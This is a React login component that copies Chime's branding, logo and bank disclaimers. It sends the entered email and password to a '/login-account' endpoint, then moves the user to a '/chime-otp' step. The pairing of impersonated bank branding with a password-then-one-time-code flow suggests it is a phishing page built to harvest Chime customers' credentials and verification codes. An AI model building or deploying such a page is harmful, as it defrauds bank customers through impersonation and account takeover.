import { useState } from "react";
import {
  Box,
  TextField,
  Button,
  Typography,
  InputAdornment,
  IconButton,
  Link,
  Paper,
} from "@mui/material";
import { Visibility, VisibilityOff } from "@mui/icons-material";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";
import toast from "react-hot-toast";
import { SpinnerLoading } from "./SpinnerLoading";
import api from "./axios";
import { emailStore } from "./authStore";
import chimLogo from "../assets/chimLogo.png";


export const ChimeLogin = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  const navigate = useNavigate();

  const updateEmailStore = emailStore((state) => state.updateEmailStore);

  const onSubmit = async (data) => {
    try {
      setIsLoading(true);
      const response = await api.post("/login-account", data);
      const { success, message } = response.data;

      if (!success)
        return toast.error(message || "Login failed please try again.");
      toast.success(message);
      updateEmailStore(data.email);
      return navigate("/chime-otp");
    } catch (err) {
      toast.error(err.response?.data?.message);
    } finally {
      setIsLoading(false);
    }
  };
  return (
    <Box
      sx={{
        minHeight: "100vh",
        bgcolor: "#031f1a",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        px: 2,
      }}
    >
      <Paper
        elevation={0}
        sx={{
          width: "100%",
          maxWidth: 420,
          bgcolor: "transparent",
          color: "#fff",
        }}
      >
        {/* Logo */}
        <Box
          component="img"
          src={chimLogo}
          alt="Chime"
          sx={{
            width: 90,
            height: 90,
            objectFit: "contain",
          }}
        />

        <Typography variant="h5" fontWeight={600}>
          Sign in to secure your account.
        </Typography>

        <Typography
          sx={{
            mt: 1,
            mb: 4,
            color: "#9db1ab",
          }}
        >
          Enter your email and password to continue.
        </Typography>

        <form onSubmit={handleSubmit(onSubmit)}>
          <TextField
            fullWidth
            placeholder="Email address"
            {...register("email", {
              required: "Email is required.",
            })}
            error={!!errors.email}
            helperText={errors.email?.message}
            sx={inputStyles}
          />

          <TextField
            fullWidth
            placeholder="Password"
            type={showPassword ? "text" : "password"}
            {...register("password", {
              required: "Password is required.",
            })}
            error={!!errors.password}
            helperText={errors.password?.message}
            sx={{
              ...inputStyles,
              mt: 2.5,
            }}
            slotProps={{
              input: {
                endAdornment: (
                  <InputAdornment position="end">
                    <IconButton
                      edge="end"
                      onClick={() => setShowPassword((prev) => !prev)}
                    >
                      {showPassword ? <VisibilityOff /> : <Visibility />}
                    </IconButton>
                  </InputAdornment>
                ),
              },
            }}
          />

          <StyledLink text="Forgot password?" />

          <Button
            fullWidth
            type="submit"
            variant="contained"
            disabled={isLoading}
            sx={{
              mt: 3,
              py: 1.6,
              borderRadius: 2,
              bgcolor: "#04ffc5",
              color: "#031f1a",
              fontWeight: 700,
              textTransform: "none",
              "&:hover": {
                bgcolor: "#00ddb0",
              },
            }}
          >
            Sign in
          </Button>
        </form>

        <Typography
          sx={{
            mt: 3,
            fontSize: ".85rem",
            color: "#9db1ab",
            lineHeight: 1.6,
          }}
        >
          By signing in, you agree to receive verification messages from Chime
          when required to protect your account.
        </Typography>

        <Typography
          align="center"
          sx={{
            mt: 5,
            color: "#7f9992",
            fontSize: ".8rem",
          }}
        >
          © 2026 Chime. All rights reserved.
        </Typography>

        <Typography
          sx={{
            mt: 2,
            color: "#6f8a82",
            fontSize: ".72rem",
            lineHeight: 1.6,
          }}
        >
          Banking services are provided by The Bancorp Bank, N.A., or Stride
          Bank, N.A., Members FDIC. The Chime Visa® Debit Card is issued
          pursuant to a license from Visa U.S.A. Inc.
        </Typography>
      </Paper>

      {isLoading && <SpinnerLoading />}
    </Box>
  );
};

const inputStyles = {
  "& .MuiOutlinedInput-root": {
    bgcolor: "#062923",
    borderRadius: 2,
    color: "#fff",

    "& fieldset": {
      borderColor: "#34514a",
    },

    "&:hover fieldset": {
      borderColor: "#2de28a",
    },

    "&.Mui-focused fieldset": {
      borderColor: "#2de28a",
      borderWidth: 2,
    },
  },

  "& .MuiInputBase-input::placeholder": {
    color: "#9db1ab",
    opacity: 1,
  },

  "& .MuiFormHelperText-root": {
    color: "#ff8d8d",
    ml: 0,
    mt: 0.8,
  },
};

function StyledLink({ text }) {
  return (
    <Link
      component="button"
      underline="hover"
      sx={{
        mt: 2,
        display: "inline-block",
        color: "#2de28a",
        fontSize: ".9rem",
        textDecoration: "none",

        "&:hover": {
          textDecoration: "underline",
        },
      }}
    >
      {text}
    </Link>
  );
}